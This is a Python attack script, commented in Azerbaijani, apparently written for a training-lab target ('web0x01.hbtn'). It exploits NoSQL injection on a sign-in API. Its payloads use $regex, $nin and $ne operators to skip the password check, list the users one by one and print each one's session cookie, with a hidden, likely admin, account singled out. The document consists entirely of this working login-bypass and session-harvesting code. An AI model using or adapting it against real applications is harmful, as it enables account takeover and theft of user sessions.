import requests
import json
import string

# Hədəf URL
url = "http://web0x01.hbtn/api/a3/nosql_injection/sign_in"

headers = {
    "User-Agent": "Mozilla/5.0 (Script)",
    "Content-Type": "application/json",
    "Origin": "http://web0x01.hbtn",
    "Referer": "http://web0x01.hbtn/a3/nosql_injection/"
}

# Axtarış simvolları (a-z, 0-9)
chars = string.ascii_lowercase + string.digits

# Tapılan bütün istifadəçilərin adlarını burada saxlayacağıq ki, təkrar düşməsin
global_known_users = []

print(f"[*] Bütün istifadəçilər və Cookie-lər axtarılır...\n")
print(f"{'USERNAME':<20} | {'COOKIE (SESSION)':<50}")
print("-" * 75)

for char in chars:
    # Hər hərf üçün (məsələn 'a' ilə başlayanlar) ayrıca dövr qururuq
    local_users = [] 
    
    while True:
        # Məntiq: Adı 'char' (məs: 'a') ilə başlasın VƏ bildiyimiz adlar olmasın
        payload = {
            "username": {
                "$regex": f"^{char}",
                "$nin": global_known_users
            },
            "password": {"$ne": ""}
        }

        try:
            r = requests.post(url, json=payload, headers=headers)
            cookie_val = r.cookies.get("session")
            
            # Əgər cookie yoxdursa və ya server boş cavab verirsə, bu hərfi bitir
            if not cookie_val:
                break

            data = r.json()
            
            if data.get("status") == "success":
                msg = data.get("message")
                username = None

                # Hal 1: Adı açıq olan istifadəçi
                if isinstance(msg, dict):
                    username = msg.get("username")
                
                # Hal 2: Adı gizli olan istifadəçi (Admin ola bilər)
                elif isinstance(msg, str):
                    # Adı gəlmir deyə onu 'exclude' edə bilmirik. 
                    # Ona görə də cookie-ni çap edib bu hərfi məcburi dayandırırıq.
                    print(f"{'HIDDEN_USER':<20} | {cookie_val} <--- [!!!] DİQQƏT")
                    break 

                # Əgər yeni istifadəçi tapdıqsa
                if username and username not in global_known_users:
                    print(f"{username:<20} | {cookie_val}")
                    
                    # Həm qlobal siyahıya, həm yerli siyahıya atırıq
                    global_known_users.append(username)
                    local_users.append(username)
                else:
                    # Eyni adam təkrar gəldisə, bu hərflə işimiz bitdi
                    break
            else:
                # Uğursuz giriş (bu hərflə başlayan başqa adam yoxdur)
                break

        except Exception as e:
            # Xəta olsa növbəti hərfə keç
            break

print("\n[*] Axtarış tamamlandı.")
